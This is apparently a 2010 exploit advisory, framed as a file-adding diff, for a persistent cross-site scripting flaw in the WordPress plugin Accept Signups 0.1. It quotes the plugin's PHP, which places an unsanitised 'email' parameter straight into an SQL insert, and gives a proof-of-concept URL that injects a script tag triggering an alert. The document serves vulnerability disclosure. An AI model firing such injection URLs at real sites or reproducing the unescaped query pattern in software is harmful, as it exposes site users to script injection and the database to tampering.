@@ -1,0 +1,22 @@
+# Exploit Title: WORDPRESS Plugin Accept Signups PERSISTENT XSS
+# Date:21/12/2010
+# Author: clshack
+# Software Link:http://wordpress.org/extend/plugins/accept-signups/
+# Version:0.1
+# Tested on: wordpress 3.03
+# CVE :
+Vulnerable code accept-signups_submit.php:
+require_once('../../../wp-config.php');//*addslashes* to GET and POST
+
+$e=$_GET['email'];
+function saveEmail($e) {
+global $wpdb;
+ $tbl = '`' . DB_NAME . '`.`' . $wpdb->prefix . 'accept-signups`';
+$q = "insert into " .$tbl . " (email, ip, timestamp) value ('$e', '".
+$_SERVER['REMOTE_ADDR'] . "', now());";
+ return $wpdb->query($wpdb->prepare($q));
+}
+
+Poc:
+http://localhost/wordpress/*wp-content/plugins/accept-signups/accept-signups_submit.php?email=clshack<script>alert(String.fromCharCode(72,
+101, 108, 108, 111, 32, 58, 68, 32))</script>*
